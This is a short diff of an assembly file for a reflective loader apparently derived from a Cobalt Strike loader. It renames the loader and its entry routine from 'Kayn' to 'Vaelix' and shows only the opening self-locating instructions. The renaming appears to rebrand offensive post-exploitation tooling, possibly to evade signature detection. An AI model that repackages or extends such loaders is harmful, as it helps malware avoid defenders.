@@ -1,14 +1,14 @@
-; KaynLdr
+; VaelixLdr
 ; Author: Paul Ungur (@C5pider)
 ; Credits: Austin Hudson (@ilove2pwn_), Chetan Nayak (@NinjaParanoid), Bobby Cooke (@0xBoku), @trickster012
 ;
 
-global KaynCaller
+global VaelixCaller
 
 section .text
 
    ; Shameless copied from Bobby Cooke CobaltStrikeReflectiveLoader (https://github.com/boku7/CobaltStrikeReflectiveLoader)
-   KaynCaller:
+   VaelixCaller:
        call pop
        pop:
        pop rcx                  
